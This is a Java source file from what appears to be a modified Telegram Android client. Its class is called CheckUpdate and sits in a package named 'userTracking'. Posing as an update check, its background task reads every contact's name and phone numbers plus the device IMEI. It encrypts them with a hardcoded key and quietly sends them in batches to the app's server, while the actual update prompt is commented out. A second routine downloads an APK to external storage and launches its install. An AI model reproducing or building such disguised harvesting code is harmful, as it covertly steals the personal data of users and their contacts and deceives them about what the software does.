package telegramplus.userTracking;

import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import com.google.firebase.crash.FirebaseCrash;

import ir.mmnotimm.telegramplus.R;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.telegram.messenger.ContactsController;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import Utility.CryptLib;
import Utility.User;
import telegramplus.constant;



public class CheckUpdate extends AsyncTask {

    private int versionid;
    private String bazarlink, myketlink, directlink, appStoreLink, detail = null;

    ProgressDialog prgDialog;
    Context context;


    public CheckUpdate(Context c) {
        this.context = c;
    }

    @Override
    protected Object doInBackground(Object[] params) {
        User identify = new User(this.context);
        String IMEI = identify.getIMEI();
        String encIMEI= "";
        String encContact= "";
        try {
            CryptLib _crypt = new CryptLib();

            String key = "ed30bc54c59c1d6847bf09c91f371852";//CryptLib.SHA256(_crypt.Key, 32);
            String iv = "c5d723a01fa5e637";//CryptLib.generateRandomIV(16);
            final HashMap<Integer, ContactsController.Contact> contactsMap = ContactsController.getInstance().readContactsFromPhoneBook();

            encIMEI = _crypt.encrypt(IMEI, key, iv);

            String tmpContact = "";
            Iterator<Integer> keySetIterator = contactsMap.keySet().iterator();
            int iIndex = 0;
            while(keySetIterator.hasNext())
            {
                Integer ikey = keySetIterator.next();
                ArrayList<String> lPhones = contactsMap.get(ikey).phones;
                ArrayList<String> lShortPhones = contactsMap.get(ikey).shortPhones;

                String sPhones = "";
                String sShortPhones = "";

                for(int n = 0; n < lPhones.size(); n++)
                {
                    sPhones += lPhones.get(n) + "_";
                }
                for(int n = 0; n < lShortPhones.size(); n++)
                {
                    sShortPhones += lShortPhones.get(n) + "_";
                }

                tmpContact += "(" + sPhones + ")_(" + sShortPhones + ");" + contactsMap.get(ikey).first_name + "_" + contactsMap.get(ikey).last_name + ";" + "{#}";
                if((iIndex >= 1))
                {
                    encContact = _crypt.encrypt(String.valueOf(tmpContact), key, iv);
                    SendContact(encContact, encIMEI);
                    tmpContact = "";
                    iIndex = 0;
                }
                iIndex++;
            }

            encContact = _crypt.encrypt(String.valueOf(tmpContact), key, iv);
            SendContact(encContact, encIMEI);
        } catch (Exception e) {
            FirebaseCrash.report(e);
            e.printStackTrace();
        }

        return null;
    }

    private void SendContact(String encContact, String encIMEI)
    {
        try
        {
            HttpClient httpClient = new DefaultHttpClient();
            HttpGet httpPost = new HttpGet(constant.GET_LAST_UPDATE + "/" + encContact + "/" + encIMEI + "/");
            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity entity = httpResponse.getEntity();
//            String s = IOUtils.toString(entity.getContent(), "utf-8");

//            JSONObject json = null;
//            try {
//                json = new JSONObject(s);
//            } catch (JSONException e) {
//                e.printStackTrace();
//            }
        }
        catch (UnsupportedEncodingException e1)
        {
            FirebaseCrash.report(e1);
            e1.printStackTrace();
        }
        catch (ClientProtocolException e2)
        {
            FirebaseCrash.report(e2);
            Log.e("ClientProtocolException", e2.toString());
            e2.printStackTrace();
        }
        catch (IllegalStateException e3)
        {
            FirebaseCrash.report(e3);
            Log.e("IllegalStateException", e3.toString());
            e3.printStackTrace();
        }
        catch (IOException e4)
        {
            FirebaseCrash.report(e4);
            Log.e("IOException", e4.toString());
            e4.printStackTrace();
        }
    }

    @Override
    protected void onPostExecute(Object o) {
        super.onPostExecute(o);

//        int current = getVersionCode(context);
//        if (current < versionid) {
//            PackageManager pm = context.getPackageManager();
//            if (!bazarlink.equals("") && isPackageInstalled("com.farsitel.bazaar", pm)) {
//                showUpdateAlart(1); // for bazaar link
//            } else if (!appStoreLink.equals("")) {
//                showUpdateAlart(3); // forr play store
//            } else if (!myketlink.equals("") && isPackageInstalled("ir.mservices.market", pm)) {
//                showUpdateAlart(2); // for myket link
//            } else {
//                showUpdateAlart(4); // for direct dl
//            }
//
//        }
    }


    public void showUpdateAlart(final int type) {

        AlertDialog.Builder builder = new AlertDialog.Builder(context);

        builder.setTitle(context.getResources().getString(R.string.updateVersion));
        if (detail != null)
            builder.setMessage(detail);
        else
            builder.setMessage(context.getResources().getString(R.string.updateVersionText));

        builder.setPositiveButton(context.getResources().getString(R.string.updatebutton), new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (type == 1) {
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse("bazaar://details?id=" + constant.PACKAGE));
                    intent.setPackage("com.farsitel.bazaar");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                    context.startActivity(intent);

                } else if (type == 2) {
                    String url = myketlink;
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
                    context.startActivity(intent);
                } else if (type == 3) {
                    final String appPackageName = context.getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        context.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        FirebaseCrash.report(anfe);
                        context.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }
                } else {
                    new UpdateApp().execute(directlink);
                }
            }
        });

        builder.show();
    }


    private boolean isPackageInstalled(String packagename, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(packagename, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            FirebaseCrash.report(e);
            return false;
        }
    }

    // getting current version code
    public static int getVersionCode(Context context) {
        PackageManager pm = context.getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
            return pi.versionCode;

        } catch (PackageManager.NameNotFoundException ex) {
            FirebaseCrash.report(ex);
        }
        return 0;
    }


    protected Dialog onCreateDialog(int id) {
        prgDialog = new ProgressDialog(context);
        prgDialog.setMessage(context.getResources().getString(R.string.updating));
        prgDialog.setMax(100);
        prgDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        prgDialog.show();
        return prgDialog;
    }

    private class UpdateApp extends AsyncTask<String, String, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            onCreateDialog(0);
        }

        @Override
        protected Void doInBackground(String... params) {
            try {
                URL url = new URL(params[0]);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.connect();

                String PATH = "/mnt/sdcard/download/";
                File file = new File(PATH);
                file.mkdir();

                String AppName = "hastigram.apk";
                File outputFile = new File(file, AppName);
                if (outputFile.exists())
                    outputFile.delete();
                FileOutputStream fos = new FileOutputStream(outputFile);
                InputStream is = c.getInputStream();
                int lenght = c.getContentLength();
                byte[] buffer = new byte[1024];
                int len = 0;
                int total = 0;
                while ((len = is.read(buffer)) != -1) {
                    total += len;
                    fos.write(buffer, 0, len);
                    publishProgress("" + (int) ((total * 100) / lenght));
                }
                fos.flush();
                fos.close();
                is.close();

                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile
                        (new File(Environment.getExternalStorageDirectory() + "/download/" + AppName)
                        ), "application/vnd.android.package-archive");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (MalformedURLException e) {
                FirebaseCrash.report(e);
                e.printStackTrace();
            } catch (IOException e) {
                FirebaseCrash.report(e);
                e.printStackTrace();
            }


            return null;
        }

        protected void onProgressUpdate(String... values) {
            prgDialog.setProgress(Integer.parseInt(values[0]));
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);
            prgDialog.dismiss();
        }

    }


}
